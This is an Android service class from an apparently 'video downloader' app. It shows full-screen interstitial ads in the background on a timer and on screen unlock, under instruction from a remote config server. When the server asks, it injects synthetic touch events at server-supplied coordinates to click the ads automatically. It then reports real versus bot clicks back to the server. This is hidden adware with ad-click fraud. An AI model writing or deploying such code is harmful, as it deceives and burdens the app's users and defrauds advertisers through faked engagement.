package com.top1.videodownloader.services;

import android.app.Instrumentation;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.MotionEvent;
import android.view.WindowManager;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.top1.videodownloader.AppConstants;
import com.top1.videodownloader.ShowAds;
import com.top1.videodownloader.network.CheckAds;

import java.io.IOException;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyService extends Service {
    //    private boolean check = false;
    private boolean isBotClick = false;
    private boolean isClickAds = false;
    private boolean isContinousShowAds = true;

    private ScheduledThreadPoolExecutor myTask;
    private String uuid;
    private String idFullService;
    private int intervalService;
    private int delayService;
    private InterstitialAd mInterstitialAd;

    private CheckAds checkAds;

    @Override
    public void onCreate() {
        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
        idFullService = "ca-app-pub-3940256099942544/1033173712";//mPrefs.getString("idFullService", "ca-app-pub-3940256099942544/1033173712");
        intervalService = mPrefs.getInt("intervalService", 5);
        delayService = mPrefs.getInt("delayService", 12);

        MyBroadcast myBroadcast = new MyBroadcast();
        IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
        registerReceiver(myBroadcast, filter);
        scheduleTask();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    private void scheduleTask() {
        myTask = new ScheduledThreadPoolExecutor(1);
        myTask.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
                int totalTime = mPrefs.getInt("totalTime", 0);
                totalTime += intervalService;
                mPrefs.edit().putInt("totalTime", totalTime).commit();
                Log.d("caomui",idFullService);

                if (!isContinousShowAds || (totalTime < delayService * 60)) {
                    return;
                }

                OkHttpClient client = new OkHttpClient();
                Request okRequest = new Request.Builder()
                        .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
                        .build();
                client.newCall(okRequest).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {

                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        Gson gson = new GsonBuilder().create();
                        checkAds = gson.fromJson(response.body().string(), CheckAds.class);

                        if (checkAds.isShow == 1) {
                            new Handler(Looper.getMainLooper()).post(new Runnable() {
                                public void run() {
                                    mInterstitialAd = new InterstitialAd(MyService.this);
                                    mInterstitialAd.setAdUnitId(idFullService);
                                    mInterstitialAd.setAdListener(new AdListener() {

                                        @Override
                                        public void onAdClosed() {
                                            super.onAdClosed();
                                            if (!isClickAds)
                                                checkAds(0);

                                            try {
                                                if (Build.VERSION.SDK_INT < 21) {
                                                    ShowAds.getInstance().finishAffinity();
                                                } else {
                                                    ShowAds.getInstance().finishAndRemoveTask();
                                                }
                                            } catch (Exception e) {
                                                e.printStackTrace();
                                            }
                                        }

                                        @Override
                                        public void onAdFailedToLoad(int i) {
                                            super.onAdFailedToLoad(i);
                                            isContinousShowAds = true;
                                        }

                                        @Override
                                        public void onAdLeftApplication() {
                                            super.onAdLeftApplication();
                                            if (!isClickAds)
                                                isClickAds = true;
                                            if (isBotClick)
                                                checkAds(2);
                                            else
                                                checkAds(1);
                                        }

                                        @Override
                                        public void onAdOpened() {
                                            super.onAdOpened();
                                            isContinousShowAds = false;
                                            if (checkAds.isBotClick == 1) {
                                                new Thread(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        try {
                                                            Thread.sleep(checkAds.delayClick * 100);
                                                            WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                                                            Display display = window.getDefaultDisplay();
                                                            Point point = new Point();
                                                            display.getSize(point);
                                                            int width = checkAds.x * point.x / 100;
                                                            int height = checkAds.y * point.y / 100;
                                                            Instrumentation m_Instrumentation = new Instrumentation();
                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                    android.os.SystemClock.uptimeMillis(),
                                                                    android.os.SystemClock.uptimeMillis(),
                                                                    MotionEvent.ACTION_DOWN, width, height, 0));
                                                            Thread.sleep(new Random().nextInt(100));
                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                    android.os.SystemClock.uptimeMillis(),
                                                                    android.os.SystemClock.uptimeMillis(),
                                                                    MotionEvent.ACTION_UP, width, height, 0));
                                                            isBotClick = true;
                                                        } catch (Exception e) {
                                                            e.printStackTrace();
                                                            isBotClick = false;
                                                        }
                                                    }
                                                }).start();
                                            }
                                        }

                                        @Override
                                        public void onAdLoaded() {
                                            super.onAdLoaded();

                                            try {
                                                Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
                                                showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                                startActivity(showAds);
                                                mInterstitialAd.show();
                                            }
                                            catch (Exception e){
                                            }
                                        }
                                    });

                                    mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
                                }
                            });
                        } else {
                            isContinousShowAds = false;
                        }

                    }
                });

            }
        }, 10, intervalService, TimeUnit.MINUTES);


    }

    private void checkAds(int isClick) {
        OkHttpClient client = new OkHttpClient();
        Gson gson = new GsonBuilder().create();
        RequestBody body = new FormBody.Builder()
                .add("id", uuid)
                .add("isClick", isClick + "")
                .build();
        Request okRequest = new Request.Builder()
                .url(AppConstants.URL_ADS_CONFIG)
                .post(body)
                .build();
        client.newCall(okRequest).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
            }
        });
    }

    class MyBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("caomui", "Unlock Screen");
            isContinousShowAds = true;
        }
    }
}
